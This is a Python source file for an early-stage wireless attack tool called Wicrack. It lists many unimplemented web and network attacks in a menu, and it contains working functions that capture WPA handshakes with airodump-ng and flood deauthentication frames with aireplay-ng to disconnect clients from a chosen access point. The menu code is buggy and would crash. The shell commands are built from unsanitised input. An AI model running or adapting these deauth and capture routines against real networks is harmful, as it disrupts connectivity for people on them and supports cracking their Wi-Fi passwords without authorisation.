#!/usr/bin/python3

import os
from threading import Thread
import time


class Wicrack(object):
    """Main class of the program"""
    __author__ = 'piper'

    def info():
        print("Wicrack v0.1")
        print("By %s"%Wicrack.__author__)
        print("github: https://github.com/piperjames/wicrack")

    menu_options = {0: 'Select Job',
                    1: {'Wifi':     {0: 'Select Interface> ',
                                     1: [],
                                     2: 'Back<<'}},
                    2: {'WebApp':   {0: 'Select Attack Method',
                                     1: 'SQL Injection (SQLi)',
                                     2: 'Cross Site Scripting (Xss)',
                                     3: 'Cross Site Request Forgery (CRSF)',
                                     4: 'Content Spoofing',
                                     5: 'Clickjacking',
                                     6: 'Tabnabbing',
                                     7: 'Denial of Service',
                                     8: 'Man-In-The-Browser',
                                     9: 'Back<<'}
                        },
                    3: {'Network':  {0: 'Select Attach Method',
                                     1: 'Bruteforcing',
                                     2: 'Man-In-The-Middle',
                                     3: 'Buffer Overflow',
                                     4: 'Back<<'}}
                    }

    def __init__(self):
        Wicrack.info()
        self.current_menu_option = [0]
        self.menu()

    def menu(self):
        print("")
        for key in Wicrack.menu_options.keys():
            if key == 0:
                print(Wicrack.menu_options[key])
            else:
                print("["+key+"] "+Wicrack.menu_options[key].keys())
                for opt in Wicrack.menu_options[key].keys():
                    print("["+str(key)+"] "+Wicrack.menu_options[key][opt].keys())
        print("")
        try:
            job = int(input("Choose Option> "))
        except Exception as e:
            job = int(input("Choose Option> "))



def capture_handshake(bssid, channel, interface='wlan0'):
    """Capture Handshake with airodump-ng"""
    print('Capturing Handshake')
    os.system("rm *.cap 2>/dev/null")
    os.popen("xterm -T 'Capture Handshake' -geometry -500+1 -e '"+\
             "airodump-ng --bssid "+bssid+" --channel "+str(channel)+\
             " --write wicrack --output-format cap "+interface+"'")

def deauthenticate_all(bssid, interface='wlan0'):
    """Deauthenticate all users on interface: %s"""%interface
    print('Deauthenticating Connected Devices')
    os.popen("xterm -T 'Deauthenticating' -geometry -1+1 -e '"+\
             "aireplay-ng --deauth 5 -a "+bssid+" "+interface+"'")
    time.sleep(5)
    os.system("killall airodump-ng")

def deauthenticate_one(bssid, station, interface='wlan0'):
    """Deauthenticate one user (%s) on interface: %s"""%(station, interface)
    print('Deauthenticating Connected Devices')
    os.popen("xterm -T 'Deauthenticating' -geometry -1+1 -e '"+\
             "aireplay-ng --deauth 5 -a "+bssid+" -c "+station+\
             " "+interface+"'")
    time.sleep(5)
    os.system("killall airodump-ng")


if __name__ == "__main__":
        Wicrack()

#Thread(target=capture_handshake, args=('BE:B3:08:CC:58:C5', 1)).start()
#Thread(target=deauthenticate, args=('BE:B3:08:CC:58:C5', 1)).start()
